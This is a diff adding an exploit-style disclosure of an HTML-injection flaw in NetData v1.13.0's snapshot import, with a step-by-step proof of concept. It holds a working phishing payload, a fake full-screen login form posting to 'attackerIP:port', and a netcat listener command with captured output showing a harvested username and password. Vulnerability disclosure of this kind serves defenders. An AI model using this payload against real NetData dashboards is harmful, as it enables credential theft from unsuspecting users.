@@ -1,0 +1,49 @@
+# ************************************************************************
+# *                Author: Marcelo Vázquez (aka s4vitar)                 *
+# *            NetData v1.13.0 HTML Injection Vulnerability              *
+# ************************************************************************
+
+# Exploit Title: NetData v1.13.0 HTML Injection Vulnerability
+# Date: 2019-03-14
+# Exploit Author: Marcelo Vázquez (aka s4vitar)
+# Collaborators: Victor Lasa (aka vowkin)
+# Vendor Homepage: https://my-netdata.io/
+# Software Link: https://docs.netdata.cloud/packaging/installer/
+# Version: <= NetData v1.13.0
+# PoC Video (Credential Harvesting): https://www.youtube.com/watch?v=zSG93yX0B8k
+
+NetData is prone to multiple HTML-injection vulnerabilities.
+
+Successful exploitation will allow attacker-supplied HTML to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+NetData 1.13.0 is vulnerable; other versions may also be affected. 
+
+Proof of Concept:
+=====================
+
+1. Export a valid snapshot using the "export/save a netdata snapshot" function from the NetData dashboard (top right on the navigation bar).
+
+2. Once it has finished exporting, attackers can manipulate the contents of said snapshot file and inject their own malicious HTML code. An example is provided below:
+
+<div style='position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;'>Please login with valid credentials:<br></br><br>Please enter your credentials to see the content:</br><br><form name='login' action='http://attackerIP:port/'><table><tr><td>Username:</td><td><input type='text' name='username'/></td></tr><tr><td>Password:</td><td><input type='text' name='password'/></td></tr><tr><td colspan=2 align=center><input type='submit' value='Login'/></td></tr></table></form></div>
+
+In this case, the attackers perform a credential theft attack where they specify the public IP and port from their own server, which is listening for new connections in order to receive the stolen credentials in plain text.
+
+3. Import the newly modified snapshot using the "import/load a netdata snapshot" function from the NetData dashboard (top right on the navigation bar).
+
+4. Once imported, the victim will see a login form that asks for their credentials.
+
+5. After they are entered, the attacker can visualize said credentials in plain text on his own server, as they are sent through a simple GET request:
+
+root@vps-server:~# nc -nlvp 4646
+Listening on [0.0.0.0] (family 0, port 4646)
+Connection from [XX.X.XXX.X] port 4646 [tcp/*] accepted (family 2, sport 36930)          
+GET /?username=test&password=passwordexample HTTP/1.1                                    
+Host: XXX.XXX.XX.XX:4646
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://localhost:19999/
+Accept-Encoding: gzip, deflate
+Accept-Language: es-ES,es;q=0.9,en;q=0.8
